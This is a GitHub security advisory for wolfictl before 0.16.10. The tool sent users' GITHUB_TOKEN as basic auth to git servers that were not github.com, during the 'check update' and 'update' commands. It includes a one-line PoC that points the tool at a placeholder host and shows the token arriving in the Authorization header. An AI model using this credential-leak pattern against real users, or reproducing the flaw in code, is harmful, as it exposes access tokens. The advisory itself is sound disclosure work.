# GitHub token can be leaked to remote non-GitHub git servers

## Package

gomod

github.com/wolfi-dev/wolfictl
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

< 0.16.10

## Patched versions

0.16.10

## Description

### Summary

A git authentication issue allows a local user’s GitHub token to be sent to remote servers other than `github.com`.

### Details

Most git-dependent functionality in wolfictl relies on its own `git` package, which contains centralized logic for implementing interactions with git repositories. Some of this functionality requires authentication in order to access private repositories. There’s a central function `GetGitAuth`:

[wolfictl/pkg/git/git.go](https://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22)

Line 22
in
[6d99909](/wolfi-dev/wolfictl/commit/6d99909f7b1aa23f732d84dad054b02a61f530e6)

|  | func GetGitAuth() \*gitHttp.BasicAuth { |
| --- | --- |

This looks for a GitHub token in the environment variable `GITHUB_TOKEN` and returns it as an HTTP basic auth object to be used with the `github.com/go-git/go-git/v5` library.

Most callers (direct or indirect) of `GetGitAuth` use the token to authenticate to github.com only; however, in some cases callers were passing this authentication without checking that the remote git repository was hosted on github.com.

#### Issue 1

One of these callers processed git URLs from Melange package configurations, cloning the package’s upstream repository in order to determine which project dependencies have been upgraded since the prior update.

[wolfictl/pkg/update/deps/cleanup.go](https://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49)

Line 49
in
[4dd6c95](/wolfi-dev/wolfictl/commit/4dd6c95abb4bc0f9306350a8601057bd7a92bded)

|  | Auth: wgit.GetGitAuth(), |
| --- | --- |

This issue affects the command `wolfictl check update`, and the set of remote git hosts is a function of the Melange package configuration files residing in the local directory specified in the command.

#### Issue 2

Another caller processes a git URL received as a command line argument and clones the repository to look for new available versions of the given project.

[wolfictl/pkg/update/update.go](https://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143)

Line 143
in
[488b538](/wolfi-dev/wolfictl/commit/488b53823350caa706de3f01ec0eded9350c7da7)

|  | Auth: wgit.GetGitAuth(), |
| --- | --- |

This issue affects the command `wolfictl update`.

---

This behavior has existed in one form or another since [0d06e15](https://github.com/wolfi-dev/wolfictl/commit/0d06e1578300327c212dda26a5ab31d09352b9d0) - committed January 25, 2023.

### PoC

```
GITHUB_TOKEN=test wolfictl update http://git.example.com/
```

Examining traffic sent to the remote server will show that the HTTP `Authorization` header contains `test` in base64 encoded format.

### Impact

This impacts anyone who ran the `wolfictl check update` commands with a Melange configuration that included a `git-checkout` directive step that referenced a git repository not hosted on github.com.

This also impacts anyone who ran `wolfictl update <url>` with a remote URL outside of github.com.

Additionally, these subcommands must have run with the `GITHUB_TOKEN` environment variable set to a valid GitHub token.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
